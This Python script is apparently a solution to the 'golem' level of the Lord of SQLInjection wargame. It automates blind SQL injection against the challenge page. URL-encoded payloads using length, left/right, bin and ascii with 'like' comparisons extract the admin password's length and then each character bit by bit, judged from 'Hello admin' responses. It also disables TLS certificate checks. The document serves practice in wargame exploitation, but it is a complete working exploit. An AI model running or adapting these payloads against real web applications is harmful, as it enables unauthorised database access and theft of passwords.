/* substr -> left, right 이용한 bit 연산 코드*/

import requests
import urllib
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
cookie = {'PHPSESSID':'Cookie'}
def get_len():
    pw_len = 1
    index = 1
    while True:
        url_encode = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php?pw=" + urllib.parse.quote(f"' || length(pw) like {index} && id like 'admin'#")
        res = requests.get(url_encode, cookies=cookie, verify=False)
        if 'Hello admin' not in res.text:
            pw_len = pw_len + 1
        else:
            break
        index = index + 1
    return pw_len    

def get_password(pass_len):
    password = ''
    j = 1
    for i in range(1, pass_len+1):
        bit = ''
        bit_length = 1
        while True:
            url_encode = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php?pw=" + urllib.parse.quote(f"' || length(bin(ascii(right(left(pw,{j}),1)))) like {bit_length} && id like 'admin")
            res = requests.get(url_encode, cookies=cookie, verify=False)
            #print(res.text)
            bit_length += 1
            if 'Hello admin' in res.text:
                j += 1
                break
        for k in range(1, bit_length):
            url_encode = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php?pw=" + urllib.parse.quote(f"' || right(left(bin(ascii(right(left(pw,{i}),1))),{k}),1) like '1' && id like 'admin")
            res = requests.get(url_encode, cookies=cookie, verify=False)
            if 'Hello admin' in res.text:
                bit += '1'
            else:
                bit += '0'
        password += chr(int(bit,2))
        print(password)
    return password

pass_len = get_len()
print(pass_len)
print(get_password(pass_len))

